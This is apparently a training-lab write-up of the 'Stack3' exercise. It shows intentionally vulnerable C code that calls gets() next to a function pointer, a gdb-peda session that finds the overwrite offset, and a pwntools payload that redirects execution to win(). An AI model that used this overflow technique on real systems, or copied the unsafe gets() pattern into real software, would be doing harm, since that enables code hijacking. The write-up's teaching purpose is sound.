# Stack3

* Source code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
    printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
    volatile int (*fp)();
    char buffer[64];

    fp = 0;

    gets(buffer);

    if(fp) {
        printf("calling function pointer, jumping to 0x%08x\n", fp);
        fp();
    }
}
```

* Solution
```
gdb-peda$ disass win
Dump of assembler code for function win:
   0x0000000000401142 <+0>:	push   rbp
   0x0000000000401143 <+1>:	mov    rbp,rsp
   0x0000000000401146 <+4>:	lea    rdi,[rip+0xebb]        # 0x402008
   0x000000000040114d <+11>:	call   0x401030 <puts@plt>
   0x0000000000401152 <+16>:	nop
   0x0000000000401153 <+17>:	pop    rbp
   0x0000000000401154 <+18>:	ret    
End of assembler dump.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000401155 <+0>:	push   rbp
   0x0000000000401156 <+1>:	mov    rbp,rsp
   0x0000000000401159 <+4>:	sub    rsp,0x60
   0x000000000040115d <+8>:	mov    DWORD PTR [rbp-0x54],edi
   0x0000000000401160 <+11>:	mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000401164 <+15>:	mov    QWORD PTR [rbp-0x8],0x0
   0x000000000040116c <+23>:	lea    rax,[rbp-0x50]
   0x0000000000401170 <+27>:	mov    rdi,rax
   0x0000000000401173 <+30>:	mov    eax,0x0
   0x0000000000401178 <+35>:	call   0x401050 <gets@plt>
   0x000000000040117d <+40>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x0000000000401182 <+45>:	je     0x4011a7 <main+82>
   0x0000000000401184 <+47>:	mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000401188 <+51>:	mov    rsi,rax
   0x000000000040118b <+54>:	lea    rdi,[rip+0xe96]        # 0x402028
   0x0000000000401192 <+61>:	mov    eax,0x0
   0x0000000000401197 <+66>:	call   0x401040 <printf@plt>
   0x000000000040119c <+71>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004011a0 <+75>:	mov    eax,0x0
   0x00000000004011a5 <+80>:	call   rdx
   0x00000000004011a7 <+82>:	mov    eax,0x0
   0x00000000004011ac <+87>:	leave  
   0x00000000004011ad <+88>:	ret    
End of assembler dump.
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ b *main+40
Breakpoint 1 at 0x40117d
gdb-peda$ run
Starting program: /root/Desktop/stack3 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe110 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBX: 0x0 
RCX: 0x7ffff7fa6a00 --> 0xfbad2288 
RDX: 0x7ffff7fa88d0 --> 0x0 
RSI: 0x405261 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL\n")
RDI: 0x7fffffffe111 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
RBP: 0x7fffffffe160 ("AJAAfAA5AAKAAgAA6AAL")
RSP: 0x7fffffffe100 --> 0x7fffffffe248 --> 0x7fffffffe52b ("/root/Desktop/stack3")
RIP: 0x40117d (<main+40>:	cmp    QWORD PTR [rbp-0x8],0x0)
R8 : 0x4052c5 --> 0x0 
R9 : 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x401060 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe240 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401170 <main+27>:	mov    rdi,rax
   0x401173 <main+30>:	mov    eax,0x0
   0x401178 <main+35>:	call   0x401050 <gets@plt>
=> 0x40117d <main+40>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x401182 <main+45>:	je     0x4011a7 <main+82>
   0x401184 <main+47>:	mov    rax,QWORD PTR [rbp-0x8]
   0x401188 <main+51>:	mov    rsi,rax
   0x40118b <main+54>:	lea    rdi,[rip+0xe96]        # 0x402028
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe100 --> 0x7fffffffe248 --> 0x7fffffffe52b ("/root/Desktop/stack3")
0008| 0x7fffffffe108 --> 0x1ffffe136 
0016| 0x7fffffffe110 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0x7fffffffe118 ("ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0032| 0x7fffffffe120 ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0040| 0x7fffffffe128 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0048| 0x7fffffffe130 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0056| 0x7fffffffe138 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040117d in main ()
gdb-peda$ x/10gx $rbp-0x8
0x7fffffffe158:	0x4134414165414149	0x3541416641414a41
0x7fffffffe168:	0x41416741414b4141	0x000000004c414136
0x7fffffffe178:	0x00007fffffffe248	0x0000000100040000
0x7fffffffe188:	0x0000000000401155	0x0000000000000000
0x7fffffffe198:	0x1385d8fc39614509	0x0000000000401060
gdb-peda$ pattern offset 0x4134414165414149
4698452060381725001 found at offset: 72
gdb-peda$ quit
root@kali:~/Desktop# python
Python 2.7.15+ (default, Nov 28 2018, 16:27:22) 
[GCC 8.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p = process("./stack3")
[x] Starting local process './stack3'
[+] Starting local process './stack3': pid 3665
>>> win_addr = p64(0x0000000000401142)
>>> payload = 'A'*72 + win_addr
>>> p.sendline(payload)
>>> print p.recvrepeat(1)
[*] Process './stack3' stopped with exit code 0 (pid 3665)
calling function pointer, jumping to 0x00401142
code flow successfully changed
```
